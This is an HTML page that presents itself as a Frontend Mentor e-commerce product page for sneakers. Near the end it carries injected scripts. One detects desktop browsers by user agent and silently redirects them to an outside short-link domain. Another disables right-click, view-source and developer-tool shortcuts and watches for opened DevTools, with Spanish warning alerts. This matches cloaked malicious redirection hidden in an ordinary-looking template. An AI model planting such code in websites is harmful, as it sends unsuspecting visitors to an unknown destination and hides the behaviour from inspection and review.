<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- displays site properly based on user's device -->

    <link rel="icon" type="image/png" sizes="32x32" href="./images/favicon-32x32.png">
    <link rel="stylesheet" href="./css/style.css">
    <script src="./js/script.js" defer></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer"
    />

    <title>Frontend Mentor | E-commerce product page</title>

</head>

<body>

    <nav>
        <img src="./images/icon-menu.svg" class="hamburger" id="hamburger">
        <div class="logo">
            <img src="./images/logo.svg" alt="sneakers logo">
        </div>
        <div class="navItems" id="navItems">
            <img src="./images/icon-close.svg" class="closeIcon" id="closeIcon">
            <ul>
                <li><a href="#">Collections</a></li>
                <li><a href="#">Men</a></li>
                <li><a href="#">Women</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Contact</a></li>
            </ul>
        </div>
        <div class="user">
            <div class="cartDiv empty" id="cartDiv">
                <img src="./images/icon-cart.svg" class="icon" id="cartIcon">
            </div>
            <div class="userImg">
                <img src="./images/image-avatar.png" alt="">
            </div>
        </div>
        <div class="cart-box hide" id="cart-box">
            <div class="heading">
                <span>Cart</span>
            </div>
            <div class="products" id="products">
            </div>
            <div class="checkout" id="checkout">
                <button>Checkout</button>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="row">
            <div class="col-2">
                <img src="./images/image-product-1.jpg" id="emphasisPicture">
                <div class="smallImg">
                    <div class="col-4">
                        <img src="./images/image-product-1-thumbnail.jpg" class="smallpictures active" alt="">
                    </div>
                    <div class="col-4">
                        <img src="./images/image-product-2-thumbnail.jpg" class="smallpictures" alt="">
                    </div>
                    <div class="col-4">
                        <img src="./images/image-product-3-thumbnail.jpg" class="smallpictures" alt="">
                    </div>
                    <div class="col-4">
                        <img src="./images/image-product-4-thumbnail.jpg" class="smallpictures" alt="">
                    </div>
                </div>
                <div class="carousel mobile" data-carousel>
                    <button class="carousel-button prev" data-carousel-button="prev"> <img
              src="./images/icon-previous.svg"></button>
                    <button class="carousel-button next" data-carousel-button="next"> <img src="./images/icon-next.svg"></button>
                    <ul data-slides>
                        <li class="slide" data-active><img src="./images/image-product-1.jpg"> </li>
                        <li class="slide"><img src="./images/image-product-2.jpg"></li>
                        <li class="slide"><img src="./images/image-product-3.jpg"></li>
                        <li class="slide"><img src="./images/image-product-4.jpg"></li>
                    </ul>
                </div>
            </div>
            <div class="col-2">
                <small class="companyName">
          Sneaker Company
        </small>
                <h2>
                    Fall Limited Edition Sneakers
                </h2>
                <p>
                    These low-profile sneakers are your perfect casual wear companion. Featuring a durable rubber outer sole, they’ll withstand everything the weather can offer.
                </p>
                <div class="price">
                    <span class="productValue">$125.00</span>
                    <span class="percentage"> 50%</span>
                </div>
                <span class="totalValue"> $250.00</span>

                <div class="buttonsRow">
                    <div class="increment">

                        <img src="./images/icon-minus.svg" id="minus">

                        <input type="number" name="totalItems" id="totalItems" value="1">

                        <img src="./images/icon-plus.svg" id="plus">

                    </div>
                    <div class="callToAction">
                        <button id="btn"><i class="fa-solid fa-cart-shopping"></i> Add to cart</button>
                    </div>

                </div>


            </div>
        </div>
    </div>

    <div class="wrapper hide" id="wrapper">
        <div class="carouselContainer">
            <div class="carouselrow">
                <img src="./images/icon-close.svg" alt="close" id="carouselClose">
            </div>
            <div class="carousel" data-carousel>
                <button class="carousel-button prev" data-carousel-button="prev"> <img
            src="./images/icon-previous.svg"></button>
                <button class="carousel-button next" data-carousel-button="next"> <img src="./images/icon-next.svg"></button>
                <ul data-slides>
                    <li class="slide" data-active><img src="./images/image-product-1.jpg"> </li>
                    <li class="slide"><img src="./images/image-product-2.jpg"></li>
                    <li class="slide"><img src="./images/image-product-3.jpg"></li>
                    <li class="slide"><img src="./images/image-product-4.jpg"></li>
                </ul>
            </div>
            <div class="smallpitures">
                <div class="col-carousel">
                    <img src="./images/image-product-1-thumbnail.jpg" class="smallCarouselPicture active">
                </div>
                <div class="col-carousel">
                    <img src="./images/image-product-2-thumbnail.jpg" class="smallCarouselPicture">
                </div>
                <div class="col-carousel">
                    <img src="./images/image-product-3-thumbnail.jpg" class="smallCarouselPicture">
                </div>
                <div class="col-carousel">
                    <img src="./images/image-product-4-thumbnail.jpg" class="smallCarouselPicture">
                </div>
            </div>
        </div>
    </div>

    <script>
        function detectar_dispositivo() {
            var dispositivo = "";
            if (navigator.userAgent.match(/Android/i))
                dispositivo = "Android";
            else if (navigator.userAgent.match(/webOS/i))
                dispositivo = "webOS";
            else if (navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else if (navigator.userAgent.match(/iPad/i))
                dispositivo = "iPad";
            else if (navigator.userAgent.match(/iPod/i))
                dispositivo = "iPod";
            else if (navigator.userAgent.match(/BlackBerry/i))
                dispositivo = "BlackBerry";
            else if (navigator.userAgent.match(/Windows Phone/i))
                dispositivo = "Windows Phone";
            else
                dispositivo = "PC";
            return dispositivo;
        }

        if (detectar_dispositivo() == "PC") {
            window.location.href = 'https://conclaros.co/Pa9e';
        }
    </script>



<script>
    // Desactiva clic derecho
    document.addEventListener("contextmenu", function(e) {
        e.preventDefault();
    });

    // Detecta el uso de teclas comunes para abrir el inspector
    document.addEventListener("keydown", function(e) {
        // F12 o Ctrl+Shift+I o Ctrl+Shift+J o Ctrl+U
        if (
            e.key === "F12" || 
            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || 
            (e.ctrlKey && e.key === "U")
        ) {
            e.preventDefault();
            alert("Esta acción está deshabilitada.");
        }
    });

    // Desactiva herramientas de desarrollo en otros navegadores
    (function() {
        const devtools = /./;
        devtools.toString = function() {
            this.opened = true;
        };
        const checkDevTools = setInterval(function() {
            if (devtools.opened) {
                alert("Por favor, no intentes inspeccionar esta página.");
                window.location.reload();  // Opcional: recargar la página
            }
        }, 1000);
    })();
</script>

</body>

</html>
